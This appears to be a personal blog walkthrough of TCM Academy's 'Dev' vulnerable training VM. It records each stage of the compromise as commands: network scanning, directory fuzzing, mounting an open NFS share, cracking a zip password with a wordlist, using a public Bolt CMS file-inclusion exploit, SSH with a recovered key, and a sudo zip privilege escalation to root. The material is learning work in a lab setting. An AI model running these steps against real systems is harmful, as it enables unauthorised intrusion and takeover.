## Welcome to my Ethical Hacking blogs
[Link](posts.html)



Machine 1
Dev by TCM Academy

This is my first write up

This Vulnerable by design VM is provided by TCM Acamdemy as part of the Practical Ethical Hacking - The Complete Course

I had to change Network cards to NAT, also for some reason this VM was dual honed, however, this is not relevant for this VM. 

Nnce VM booted, I had to log in and run (creds are provided in a text file byt TCM)
```markdown
DHClient
```


Then run Netdiscover to get target IP, for me.
```markdown
sudo netdiscover -r 192.168.22.0/24
```
I find our target VM
192.168.22.136
Next step is to run NMAP
```markdown
sudo nmap -A -p- -T4 192.168.22.136
```

![image](https://user-images.githubusercontent.com/66864342/160243024-f237bfba-81e5-4266-8bd8-12e3805577fa.png)
![image](https://user-images.githubusercontent.com/66864342/160243035-fb8b2c2a-664a-43e4-8244-7aba436d9488.png)

Interesting ports and info
- 22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
- 80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
- _http-server-header: Apache/2.4.38 (Debian)
- _http-title: Bolt - Installation error
- 111/tcp   open  rpcbind  2-4 (RPC #100000)
- 2049/tcp  open  nfs_acl  3 (RPC #100227)
- 8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
-	_http-server-header: Apache/2.4.38 (Debian)
-	_Methods supported:CONNECTION
-	_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
- Running Linux 4.X 5.X
- OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
- OS details: Linux 4.15 - 5.6
- Network Distance: 1 hop
- Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel!

Browse to port http://192.168.22.136:80
Default webpage bolt installation error?

![image](https://user-images.githubusercontent.com/66864342/160243232-38f450e6-66ee-4140-946f-4cf00e9c9f08.png)


Browse to http://192.168.22.136:8080
Discovered PHP settings


![image](https://user-images.githubusercontent.com/66864342/160243472-26a386e7-8ee1-4766-9c42-a8b12c983547.png)


Then I ran FFUF to parse web folders in two tabs
```markdown
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.22.136/FUZZ
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.22.136:8080/FUZZ
```

So then I checked NFS
```markdown
Showmount -e 192.168.22.136 for nfs
```

mkdir in mnt i called it nfs
```markdown
cd mnt
mkdir nfs
sudo mount -t nfs 192.168.22.136:/srv/nfs /mnt/nfs -o nolock
```

In nfs folder I found a file called save.zip


![image](https://user-images.githubusercontent.com/66864342/160244210-cb28624a-b755-4284-8f4d-2ebd4efa4ec8.png)


However the file is password protected. so I tried fcrack!
```markdown
Fcrack -v -u -D -p /usr/share/wordlists/rockyou.txt
```

info
-v=verbose -u=unzip -D=dictionary -p=file


password is java101

I extract 2 files

![image](https://user-images.githubusercontent.com/66864342/160245066-0cf3a05e-29cc-4093-b373-11ca7aaca0b5.png)


Ok so then I cat both files

![image](https://user-images.githubusercontent.com/66864342/160245036-adf5e998-18cb-40ca-a990-ea3f22476fa8.png)

the id_rsa is a certificate file


I discovered the following web folders


![image](https://user-images.githubusercontent.com/66864342/160243845-7911f7ae-a700-4cbd-991a-4e48fd81a3cb.png)


Opened config.yaml and we Find a username & password


![image](https://user-images.githubusercontent.com/66864342/160244148-5dcb3f37-b215-47f1-9b77-6e9fafc0847c.png)



I wnet back to port 80 and see what bolt is...
After Googling, it seems to be a CMS, I also find an exploit for a local file inclusion
https://www.exploit-db.com/exploits/48411


![image](https://user-images.githubusercontent.com/66864342/160244458-e91cdcf8-2f4c-4af6-a7f5-ccf99d837cba.png)

Run the exploit after registering an account

![image](https://user-images.githubusercontent.com/66864342/160244777-797f3760-e6d2-49ec-8f19-708e976adc1a.png)



![image](https://user-images.githubusercontent.com/66864342/160244472-ad6caaa5-1ec9-4a8f-8411-53bf70e56edf.png)


The one of interest to me is the user 1000 permission futher down the list

jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash


![image](https://user-images.githubusercontent.com/66864342/160244492-f39e6c95-d357-4250-a950-21da05052723.png)

Ok so then I  tried logging in as jeanpaul with a password (this didnt work, so used SSH -i id_rsa - I also had to change permission on file to 400

```markdown
ssh -i id_rsa jeanpaul@192.168.22.136
```

```markdown
sudo -l
```
   (root) NOPASSWD: /usr/bin/zip
   
So the above means I can run zip as root

So goto GTFOBINS
https://gtfobins.github.io/

search for ZIP, and get the sudo one

type commands one line at a time
```markdown
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

![image](https://user-images.githubusercontent.com/66864342/160245568-96c1fe61-2516-4811-b792-0358998ad105.png)



BOOM JOB DONE!
Thanks to TCM Academy for the VM





